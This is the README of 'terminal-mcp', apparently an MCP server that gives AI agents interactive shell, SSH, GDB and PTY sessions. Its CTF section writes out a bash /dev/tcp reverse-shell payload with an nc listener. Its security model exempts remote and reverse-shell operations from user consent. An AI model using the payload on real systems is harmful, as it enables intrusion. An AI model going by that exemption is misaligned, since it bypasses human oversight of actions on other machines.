# terminal-mcp

MCP (Model Context Protocol) server for **long-lived interactive shell sessions** — designed for AI agents executing complex, multi-step workflows that require maintaining state, observing intermediate outputs, and adapting to unpredictable prompts.

## Table of Contents

- [Core Philosophy](#core-philosophy)
- [Features](#features)
- [Architecture](#architecture)
- [Quick Start](#quick-start)
- [Interactive Session Lifecycle](#interactive-session-lifecycle)
- [Scenarios](#scenarios)
  - [GDB / pwndbg Debugging](#gdb--pwndbg-debugging)
  - [SSH Remote Connection](#ssh-remote-connection)
  - [sudo Password Handling](#sudo-password-handling)
  - [Driving Full-Screen TUI Programs (PTY mode)](#driving-full-screen-tui-programs-pty-mode)
  - [CTF Reverse Shell Listener](#ctf-reverse-shell-listener)
- [Tools Reference](#tools-reference)
- [Prompt Templates](#prompt-templates)
- [Resources](#resources)
- [Security Model](#security-model)
- [Audit Logs](#audit-logs)
- [Contributing](#contributing)
- [License](#license)

## Core Philosophy

Two distinct execution modes, choose the right one:

| Mode | Tool | When to use |
|---|---|---|
| **One-shot** | `exec` | Simple, non-blocking commands with deterministic output (ls, cat, curl, grep...). Process exits after execution. |
| **Interactive loop** | `shell_*` | Stateful, multi-turn operations requiring progressive observation and decision-making: REPLs, debuggers, remote shells, password prompts, full-screen TUI programs, reverse shell listeners. |

For any scenario where you cannot predict the exact number of steps or must react to intermediate output, use the **closed loop**:

```
shell_spawn → shell_send_line → shell_output (or shell_wait_for) → (observe → decide → send_line/send_control/send_keys → observe ...) → shell_close
```

After every input-sending call (`shell_send_line`, `shell_send`, `shell_send_control`, `shell_send_keys`, `shell_move_cursor`), you **must** call `shell_output` / `shell_wait_for` (pipe mode) or `shell_snapshot` (PTY mode) to confirm the state before deciding the next step. Never batch commands speculatively — this holds true even when driving full-screen TUI programs, where it is easy to be tempted into sending several keystrokes at once assuming you already know what the screen will look like.

## Features

- **One-shot execution** — `exec` with configurable shell interpreter (bash/sh/zsh/python/node...), timeout, and non-blocking output capture
- **Stateful interactive sessions** — Full lifecycle management across 16 `shell_*` tools: spawn, send, send-line, send-control, send-keys, output, wait-for, snapshot, cursor-position, move-cursor, resize, list, exists, reset, close, close-all
- **Long-running process support** — `shell_wait_for` with pattern matching and timeout for uncertain-duration commands (gdb continue, SSH handshake, large downloads); poll-based observation as fallback
- **PTY (Pseudo-Terminal) mode** — Spawn sessions with `pty=true` for programs that require a real terminal (sudo, colored output, tty-sensitive tools); observe the rendered screen (with cursor position) via `shell_snapshot`, or actually **drive full-screen TUI programs** (vim/nano/htop/less/whiptail/menuconfig) via `shell_send_keys` + `shell_cursor_position` + `shell_move_cursor` + `shell_resize`
- **ANSI-aware raw output** — `shell_output` / `shell_wait_for` support an optional `strip_ansi` flag to strip escape/control sequences from raw incremental text before returning/matching it — most useful in PTY mode, where the byte stream is otherwise heavily interleaved with cursor/color codes
- **Built-in prompt templates** — Guided step-by-step workflows for GDB/pwndbg debugging, SSH connections, and CTF reverse shell listener setup
- **Resource documentation** — Inline guides via `guide://shell/*` URIs (security policy, lifecycle basics, PTY guide, TUI-driving guide, per-scenario recipes)
- **Shell blacklist** — Blocks direct invocation of interactive programs (gdb, ssh, mysql, psql, etc.) as interpreters; enforces the correct spawn-bash-then-send pattern
- **Audit logging** — Every command invocation recorded as structured JSON (trace ID, timing, shell/tag/input, success/failure) to daily rolling logs

## Architecture

```
MCP Client (AI Agent / LLM)
│
│ JSON-RPC over stdin/stdout
▼
┌──────────────────────────────────────┐
│  rmcp Server (TerminalMcpService)    │
│  ┌────────────────────────────────┐  │
│  │ @tool  » exec                  │  │
│  │ @tool  » shell_spawn           │  │
│  │ @tool  » shell_send            │  │
│  │ @tool  » shell_send_line       │  │
│  │ @tool  » shell_send_control    │  │
│  │ @tool  » shell_send_keys       │  │
│  │ @tool  » shell_output          │  │
│  │ @tool  » shell_wait_for        │  │
│  │ @tool  » shell_snapshot        │  │
│  │ @tool  » shell_cursor_position │  │
│  │ @tool  » shell_move_cursor     │  │
│  │ @tool  » shell_resize          │  │
│  │ @tool  » shell_list            │  │
│  │ @tool  » shell_exists          │  │
│  │ @tool  » shell_reset           │  │
│  │ @tool  » shell_close           │  │
│  │ @tool  » shell_close_all       │  │
│  ├────────────────────────────────┤  │
│  │ @prompt » usage/gdb/ssh/rev    │  │
│  ├────────────────────────────────┤  │
│  │ Resources » guide://shell/*    │  │
│  └────────────────────────────────┘  │
│  ┌────────────────────────────────┐  │
│  │ Session Store (pipe / pty)     │  │
│  │ DashMap<tag, Arc<Mutex<Shell>> │  │
│  └────────────────────────────────┘  │
│  ┌────────────────────────────────┐  │
│  │ audit::with_audit()            │  │
│  │  → JSON logs per command       │  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘
```

## Quick Start

### Install

```bash
cargo install terminal-mcp
```

The binary `terminal-mcp` will be placed in `~/.cargo/bin/`. Ensure this directory is in your `PATH`.

### Build from Source

```bash
git clone https://github.com/ZEROLINGG/terminal-mcp
cd terminal-mcp
cargo build --release
```

Binary at `target/release/terminal-mcp`.

PTY support (`shell_spawn(pty=true)`, `shell_snapshot`, `shell_cursor_position`, `shell_move_cursor`, `shell_resize`) is gated behind the `pty` cargo feature. If your build does not enable it, those tools return an explicit "not compiled with pty support" error instead of panicking, and `shell_list` reports `is_pty: false` / `pty_size: null` for all sessions. Enable it explicitly if needed:

```bash
cargo build --release --features pty
```

(Check `Cargo.toml` for whether `pty` is a default feature in your checked-out version.)

### Configure MCP Client

Add to your MCP client configuration (e.g., `opencode.json`):

```json
{
  "mcpServers": {
    "terminal-mcp": {
      "command": "terminal-mcp"
    }
  }
}
```

### Environment Variables

| Variable | Default | Description |
|---|---|---|
| `RUST_LOG` | `warn,audit=info` | Log level filter. The `audit=info` target is what drives the structured audit trail described in [Audit Logs](#audit-logs); lowering it will suppress audit records. |

## Interactive Session Lifecycle

The `shell_*` family (16 tools) provides fine-grained control over long-lived processes. Understanding the lifecycle is critical for reliable multi-step automation.

### Tag-based Sessions

Each interactive session is identified by a user-defined `tag` (e.g., `"py1"`, `"gdb1"`, `"ssh1"`). Tags allow running multiple independent sessions concurrently.

### Tool Chain

1. **`shell_spawn(shell, tag, pty?, cols?, rows?)`** — Create a session with the specified interpreter (bash/sh/zsh/python/node...). Set `pty=true` to spawn in PTY mode (default window size 100x40, customizable via `cols`/`rows`). Interactive programs like gdb/ssh must NOT be passed directly as `shell`; spawn bash first, then send the program as a command.

2. **`shell_send_line(input, tag)`** — Send a command with a trailing newline (equivalent to pressing Enter). Returns `"sent"` immediately without output — always follow with `shell_output` / `shell_wait_for` / `shell_snapshot`.

3. **`shell_send(input, tag)`** — Send raw bytes without a trailing newline. Not recommended for control characters — use `shell_send_control` instead.

4. **`shell_send_control(tag, key)`** — Send a standard terminal control character. `"C"` = Ctrl+C (interrupt), `"D"` = Ctrl+D (EOF), `"Z"` = Ctrl+Z (suspend, PTY mode only), `"?"` = DEL. Clearer and safer than embedding raw bytes. In pipe (non-PTY) mode, only two special semantics survive: `R` = reset the session (equivalent to `shell_reset`), `D` = close stdin.

5. **`shell_send_keys(tag, keys)`** — Send an ordered sequence of literal text and/or special keys (`[Up]`, `[Down]`, `[Left]`, `[Right]`, `[Home]`, `[End]`, `[PageUp]`, `[PageDown]`, `[Insert]`, `[Delete]`, `[Tab]`, `[BackTab]`, `[Enter]`, `[Escape]`, `[Backspace]`, `[F1]`..`[F12]`) as a single burst. Use for shell-history recall, in-line editing, tab-completion, menu navigation, and driving full-screen TUI programs together with `shell_snapshot`. Unknown bracket tags return an explicit error rather than being silently sent as text. See [Driving Full-Screen TUI Programs](#driving-full-screen-tui-programs-pty-mode) and `guide://shell/tui`.

6. **`shell_output(tag, idle_ms?, strip_ansi?)`** — Read buffered stdout/stderr. Waits until output is silent for `idle_ms` (default 200ms) before returning incremental output. Set `strip_ansi=true` to strip ANSI escape/control sequences (colors, cursor movement, screen-clearing, etc.) from the returned text before it's returned — this is primarily intended for **PTY-mode sessions**, where the raw byte stream is frequently interleaved with such sequences and hard to read as plain text. Note that stripping escape codes is not the same as reconstructing the rendered screen (no line-wrap/overwrite resolution) — once you need the actual on-screen layout, switch to `shell_snapshot`. **Must be called after every send_line to confirm state** (or use `shell_wait_for`).

7. **`shell_wait_for(tag, pattern, timeout_ms?, strip_ansi?)`** — Block until `pattern` appears in stdout/stderr or timeout elapses (default 5000ms). Set `strip_ansi=true` to strip ANSI sequences from stdout/stderr **before** both the pattern match and the returned text are computed — mainly useful in PTY mode, where a plain-text `pattern` might otherwise fail to match because it happens to be interrupted by embedded escape codes. Returns `stdout`, `stderr`, and a `matched` boolean (`false` = timed out without seeing the pattern). Prefer this over repeated `shell_output` calls for uncertain-duration commands.

8. **`shell_snapshot(tag, idle_ms?)`** *(PTY sessions only)* — Get a rendered virtual terminal screen snapshot plus the current cursor position. Returns `{ "screen": "...", "cursor": {"row":.., "col":..} }` (cursor 0-based, `null` if unavailable). **Always prefer this over `shell_output`/`strip_ansi` in PTY mode** to understand the program's actual on-screen state, including inside full-screen TUI programs — stripping ANSI codes from raw output only removes escape bytes, it does not reconstruct the true rendered layout the way this tool does.

9. **`shell_cursor_position(tag)`** *(PTY sessions only)* — Get just the current cursor (row, col; 0-based) without a full screen payload. Cheaper than `shell_snapshot` when you only need the caret/selection position.

10. **`shell_move_cursor(tag, row, col)`** *(PTY sessions only)* — Move the cursor to an absolute 1-based (row, col) position via a standard ANSI CUP sequence. Only affects where subsequently sent characters land; does not by itself trigger program behavior (unless the running program itself reads cursor-addressed input, as some TUI programs do).

11. **`shell_resize(tag, cols, rows)`** *(PTY sessions only)* — Dynamically resize an already-running PTY session's terminal window without losing session state. Use when a column/row-sensitive program needs a different size mid-session. `cols`/`rows` must both be `>= 1`.

12. **`shell_reset(tag)`** — Force-restart a session when stuck in an infinite loop or hung state.

13. **`shell_close(tag)`** — Terminate and remove a session. **Always close sessions when done** to prevent zombie processes.

14. **`shell_close_all`** — Cleanup all active sessions at once.

15. **`shell_list`** — List all active tags with shell paths, PTY status/window size, truncation info, and busy state.

16. **`shell_exists(tag)`** — Check if a given tag is currently active.

### Output Polling for Long-Running Commands

For operations with uncertain execution time (gdb `continue`, SSH handshake, large file downloads, long compilations):

- **Use `shell_wait_for`** — `shell_wait_for(tag, pattern, timeout_ms)` blocks until the expected keyword appears or the timeout elapses, reducing the number of interaction turns. The response includes a `matched` field indicating whether the pattern was actually seen.
- **Fallback to polling** — if no specific keyword is known in advance, call `shell_output` with a larger `idle_ms` (2000–5000ms) and poll again rather than waiting indefinitely in a single call
- **Never batch commands** — always read output before deciding the next action

### Limitations

- **Pipe mode (pty=false)**: Full-screen TUI/GUI programs (vim/nano/htop/less/whiptail, etc.) are prohibited — use cat/head/grep/ps instead, since there is no way to observe the actual screen layout without a real terminal.
- **PTY mode (pty=true)**: Full-screen TUI interaction IS supported via `shell_snapshot` + `shell_send_keys` + `shell_cursor_position` + `shell_move_cursor` + `shell_resize`. See [Driving Full-Screen TUI Programs](#driving-full-screen-tui-programs-pty-mode) and `guide://shell/tui` for the required send→snapshot→decide workflow.
- **No real-time interaction**: The tool always works by "send → observe → decide". It cannot perform continuous real-time interaction that requires responding to a changing screen at human speed. Never chain many key-sends assuming you already know what the screen will look like several steps ahead — this applies doubly inside full-screen TUI programs, where terminal size, current mode, or timing can all change the outcome.

## Scenarios

### GDB / pwndbg Debugging

A stateful debugging session where every next instruction depends on observing register state, breakpoint hits, and program flow.

```
shell_spawn(shell="bash", tag="gdb1")
shell_send_line(input="gdb ./target_binary", tag="gdb1")
shell_output(tag="gdb1", idle_ms=1000)         ← confirm (gdb) prompt
shell_send_line(input="break main", tag="gdb1")
shell_output(tag="gdb1")                       ← confirm breakpoint set
shell_send_line(input="run", tag="gdb1")
shell_wait_for(tag="gdb1", pattern="Breakpoint", timeout_ms=5000)  ← wait for breakpoint hit
shell_send_line(input="next", tag="gdb1")                           ← single-step
shell_output(tag="gdb1")
shell_send_line(input="print var", tag="gdb1")                      ← inspect variable
shell_output(tag="gdb1")
shell_close(tag="gdb1")
```

Key points:
- `continue`/`run` have uncertain execution time — use `shell_wait_for(tag, pattern, timeout_ms)` with an appropriate pattern (e.g., `"Breakpoint"`/`"hit"`/`"exited"`); if it times out, call again
- pwndbg may have long startup delay while loading debug symbols — poll `shell_output` repeatedly or use `shell_wait_for` targeting the `(gdb)`/`pwndbg>` prompt
- `gdb` is NOT a valid `shell` value for `shell_spawn` — spawn `bash` first, then send `gdb ...` as a command

### SSH Remote Connection

Multi-turn interactive login with unpredictable intermediate prompts (host key, password, or key-auth skip).

```
shell_spawn(shell="bash", tag="ssh1")
shell_send_line(input="ssh user@host", tag="ssh1")
shell_output(tag="ssh1", idle_ms=1500)
  → "continue connecting (yes/no)?" → shell_send_line("yes")
  → "password:"                    → shell_send_line(password)
  → appears remote prompt          → key auth passed, proceed
```

After login, **every subsequent `shell_send_line` executes on the remote host** until you explicitly `send_line("exit")` to return to the local shell. Always `shell_close(tag="ssh1")` when finished. `ssh` is also NOT a valid `shell` value for `shell_spawn`.

### sudo Password Handling

```
shell_spawn(shell="bash", tag="b1")
shell_send_line(input="sudo apt update", tag="b1")
shell_output(tag="b1")
  → "[sudo] password for ..." → shell_send_line(password)
shell_output(tag="b1", idle_ms=1000)          ← increase for slow commands
shell_close(tag="b1")
```

If `shell_output` shows nothing after sending the sudo command (no password prompt), sudo may be refusing to run without a real terminal. Re-spawn with `shell_spawn(shell="bash", tag="b1", pty=true)` and prefer `shell_snapshot` over `shell_output` to check for the prompt. See `guide://shell/pty`.

### Driving Full-Screen TUI Programs (PTY mode)

PTY mode plus the full pty toolkit (`shell_snapshot`, `shell_cursor_position`, `shell_send_keys`, `shell_move_cursor`, `shell_resize`) supports actually **operating** full-screen redraw-based programs — vim, nano, htop, less, whiptail/dialog wizards, menuconfig-style configuration tools, and similar — not just observing them. The interaction model is still strictly turn-based (send → snapshot → decide), never true real-time keystroke-by-keystroke human interaction.

Example: edit a file with vim.

```
shell_spawn(shell="bash", tag="t1", pty=true)          ← default 100x40
shell_send_line(input="vim file.txt", tag="t1")
shell_snapshot(tag="t1", idle_ms=300)                  ← ALWAYS use snapshot, never shell_output, inside vim
  → inspect "screen" text + "cursor" position

shell_send(input="ihello world", tag="t1")             ← enter insert mode, type text
shell_snapshot(tag="t1", idle_ms=300)                  ← confirm text was inserted correctly

shell_send_keys(tag="t1", keys=["[Escape]"])           ← back to normal mode
shell_send_line(input=":wq", tag="t1")                 ← save and quit
shell_output(tag="t1", idle_ms=500)                    ← confirm back at the shell prompt

shell_close(tag="t1")
```

Key points:
- Never send a long chain of keys assuming you already know the exact screen several steps ahead — re-snapshot after every action.
- If rendering looks broken, call `shell_resize(tag, cols, rows)` and re-snapshot rather than guessing blind.
- If truly stuck (garbled screen, unresponsive program), use `shell_send_control(tag, key="C")` or `shell_reset` as escape hatches instead of looping indefinitely.
- Prefer exiting through the program's own proper quit sequence (`:wq`/`:q!` in vim, `q` in htop/less, Cancel/Exit in whiptail) before `shell_close`, though `shell_close` will still forcibly terminate the session if needed.
- `guide://shell/security` still applies in full: if a TUI interaction ends up performing a Rule-2 action (saving a system-altering config change, applying a persistent/destructive change via a menuconfig-like tool), it requires the same explicit user consent as running that action from a plain command line.

See `guide://shell/tui` and `guide://shell/pty` for the complete guidance.

### CTF Reverse Shell Listener

Setting up a local nc listener and stabilizing a reverse connection from a target machine.

**Listener side** (on the agent's machine):
```
shell_spawn(shell="bash", tag="listener")
shell_send_line(input="nc -lvnp 4444", tag="listener")
shell_output(tag="listener", idle_ms=500)     ← expect "listening on [any] 4444"
```

**Target side** (delivered through a web shell / RCE, not via this tool directly):

Payload example:
```bash
bash -i >& /dev/tcp/<ip>/4444 0>&1
```

**After connection established** — the listener session becomes the target's shell:
```
shell_wait_for(tag="listener", pattern="$", timeout_ms=5000)   ← wait for target prompt
shell_send_line(input="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tag="listener")
shell_send_line(input="export TERM=xterm", tag="listener")
```

All subsequent commands execute on the target. Observe output before each next step. `shell_close(tag="listener")` when done.

`nc` here is run as an ordinary command inside the bash session — it is not passed to `shell_spawn` as the `shell` value.

## Tools Reference

| Tool | Description | Key Parameters |
|---|---|---|
| `exec` | One-shot command execution, process exits after completion | `input`, `shell` (default: bash), `timeout_ms?` |
| `shell_spawn` | Create an interactive session (pipe or PTY mode) | `shell`, `tag`, `pty?`, `cols?`, `rows?` |
| `shell_send_line` | Send command + newline (most common) | `input`, `tag` |
| `shell_send` | Send raw bytes, no newline | `input`, `tag` |
| `shell_send_control` | Send terminal control character (^C, ^D, ^Z, DEL) | `tag`, `key` |
| `shell_send_keys` | Send special keys/text burst (arrows, Enter, Escape, F-keys, etc.) | `tag`, `keys` |
| `shell_output` | Read buffered stdout/stderr, with optional ANSI stripping | `tag`, `idle_ms?`, `strip_ansi?` |
| `shell_wait_for` | Wait until pattern appears in output (with timeout), with optional ANSI stripping applied before matching | `tag`, `pattern`, `timeout_ms?`, `strip_ansi?` |
| `shell_snapshot` | Get rendered terminal screen + cursor position (PTY only) | `tag`, `idle_ms?` |
| `shell_cursor_position` | Get current cursor position (PTY only) | `tag` |
| `shell_move_cursor` | Move cursor to absolute 1-based position via ANSI CUP (PTY only) | `tag`, `row`, `col` |
| `shell_resize` | Dynamically resize PTY window without losing state (PTY only) | `tag`, `cols`, `rows` |
| `shell_list` | List all sessions with PTY status/size and truncation info | — |
| `shell_exists` | Check if a tag exists | `tag` |
| `shell_reset` | Kill and restart a session | `tag` |
| `shell_close` | Close a single session | `tag` |
| `shell_close_all` | Close all sessions | — |

## Prompt Templates

Built-in prompts generate step-by-step instructions for AI agents:

| Prompt | Parameters | Description |
|---|---|---|
| `shell_usage_guide` | — | Core principles: when to use exec vs interactive sessions |
| `gdb_debug_session` | `binary_path`, `tag?` | Full GDB/pwndbg debugging workflow |
| `ssh_connect_session` | `host`, `user`, `tag?` | SSH connection with multi-step authentication |
| `reverse_shell_session` | `attacker_ip`, `port?`, `tag?` | CTF reverse shell listener setup |

## Resources

Inline documentation accessible by AI agents via `read_resource`:

| URI | Content |
|---|---|
| `guide://shell/security` | Security guidelines — must read first |
| `guide://shell/basics` | Session lifecycle and best practices |
| `guide://shell/pty` | PTY mode guide: when to enable pty, preferring shell_snapshot, strip_ansi caveats |
| `guide://shell/tui` | Driving full-screen TUI programs (vim/htop/less/whiptail/menuconfig) in pty mode |
| `guide://shell/gdb` | GDB/pwndbg debugging workflow |
| `guide://shell/ssh` | SSH remote connection workflow |
| `guide://shell/sudo` | sudo password/confirmation handling |
| `guide://shell/reverse_shell` | Reverse shell listener workflow |

## Security Model

- **Audit trails**: Every `exec` / `shell_spawn` / `shell_send` / `shell_send_line` / `shell_send_control` / `shell_send_keys` / `shell_output` / `shell_wait_for` / `shell_snapshot` / `shell_cursor_position` / `shell_move_cursor` / `shell_resize` / `shell_reset` / `shell_close` / `shell_close_all` call is fully recorded with command content, shell type, tag, and timing
- **Explicit consent**: Destructive operations, privilege escalation, network exposure, and persistent changes require user approval before execution — this applies equally whether the action is triggered via a plain command line or via full-screen TUI interaction (e.g. saving a system-altering change inside a menuconfig-style tool)
- **Read-only by default**: Commands like ls, cat, grep, ps, df that do not modify state can execute directly
- **PTY-specific operations are low-risk by themselves**: `shell_send_control` / `shell_send_keys` / `shell_cursor_position` / `shell_move_cursor` / `shell_resize` only act on subprocess sessions created by this tool itself (identified by tag), not arbitrary system processes — their risk is comparable to normal command execution within the same session and does not by itself require elevated scrutiny, though forcibly interrupting a relied-upon task should still be communicated to the user
- **Remote operations**: SSH sessions and reverse shells inherently operate on remote targets and are exempt from local consent requirements (unless they write to local disk or tunnel back to the local machine)

Full security policy available at `guide://shell/security`.

## Audit Logs

All tool calls are logged as structured JSON to `logs/terminal_audit.log` (daily rolling) with:

- `trace_id` — UUID v4 per invocation
- `action` — tool name
- `shell`, `tag`, `input` — command context (`input` reflects the semantic payload — e.g. `^C` for control keys, a space-joined key sequence for `shell_send_keys`, `(row,col)` for `shell_move_cursor`, `colsxrows` for `shell_resize`)
- `begin` / `end` events with duration and success/failure status

## Contributing

Issues and pull requests are welcome — in particular around additional guide resources, prompt templates for new scenarios, and platform-specific PTY behavior. Please keep new tools/resources consistent with the existing "send → observe/snapshot → decide" discipline documented throughout the guides.

## License

[MIT](LICENSE)